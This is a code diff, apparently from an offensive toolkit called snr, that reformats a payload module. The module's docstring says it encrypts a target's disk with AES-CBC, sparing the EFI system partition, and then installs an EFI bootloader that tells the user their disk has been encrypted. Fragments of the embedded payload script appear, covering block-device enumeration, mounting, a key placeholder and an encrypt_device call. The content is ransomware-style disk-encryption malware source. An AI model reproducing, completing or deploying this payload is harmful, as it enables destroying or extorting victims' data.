@@ -1,13 +1,15 @@
 """
-Payload that encrypts the disk with AES-CBC, leaving the ESP alone. Then install an EFI file as the bootloader which 
-shows a message letting the user know their disk has been encrypted and a custom message.
+Payload that encrypts the disk with AES-CBC, leaving the ESP alone. 
+Then install an EFI file as the bootloader which shows a message letting
+the user know their disk has been encrypted and a custom message.
 """
 
 import random
 
+from libsnr.util.common_utils import print_ok, print_warning, rootfs_open
 from libsnr.util.payloads.autorun import Autorun
 from snr.variables import global_vars
-from libsnr.util.common_utils import rootfs_open, print_warning, print_ok
+
 LICENSE = "Apache-2.0"
 AUTHORS = ["GlobularOne"]
 INPUTS = (
@@ -18,8 +20,7 @@ ONLINE = True
 
 DEB_DEPENDENCIES = ("python3-pycryptodome",)
 
-PAYLOAD= r"""#!/usr/bin/python3
-
+PAYLOAD = r"""#!/usr/bin/python3
 import os
 import platform
 import shutil
@@ -29,7 +30,7 @@ from libsnr.payload.storage import query_all_block_info, get_partition_root
 from libsnr.payload.context import create_context_for_mountpoint
 from libsnr.util.programs.mount import Mount
 from libsnr.util.programs.umount import Umount
-from libsnr.util.common_utils import print_info
+from libsnr.util.common_utils import print_ok, print_info, print_error
 from Cryptodome.Cipher import AES
 
 KEY = "@KEY@".encode()
@@ -86,7 +87,8 @@ def main():
                     errorcode = Mount().invoke_and_wait(
                         None, child["path"], FS_MOUNTPOINT)
                     if errorcode != 0:
-                        print_info(f"Failed to mount '{child['path']}'! Assuming it's not the ESP")
+                        print_info(
+                            f"Failed to mount '{child['path']}'! Assuming it's not the ESP")
                         # Encrypt it anyway
                         encrypt_device(child)
                         continue
@@ -125,10 +127,12 @@ if __name__ == "__main__":
     main()
 """
 
+
 def load():
     global_vars.set_variable(
-        "MESSAGE", "", 1024, "Custom additional message to show"   
+        "MESSAGE", "", 1024, "Custom additional message to show"
     )
+
 
 def unload():
     for inp in INPUTS:
